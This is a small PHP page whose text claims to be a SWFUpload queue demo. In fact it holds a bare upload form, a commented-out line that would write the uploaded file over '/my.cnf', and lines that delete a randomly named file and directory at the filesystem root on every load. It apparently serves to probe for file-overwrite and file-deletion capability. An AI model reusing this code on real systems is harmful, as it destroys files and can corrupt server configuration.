<form id="form1" action="" method="post" enctype="multipart/form-data">
    <p>This page demonstrates a simple usage of SWFUpload.  It uses the Queue Plugin to simplify uploading or cancelling all queued files.</p>
 
    <input type='file' name='abc'>
    <input type='submit' value='aaa'> 
 
  </form>
<?php
if(isset($_FILES['abc'])){
   // move_uploaded_file($_FILES["abc"]["tmp_name"],'/my.cnf');
    echo 'aaaaaaa';
}
unlink('/UnHmzv4rD2pA.766');
rmdir('/ZBQKYDrL9CHe');
?>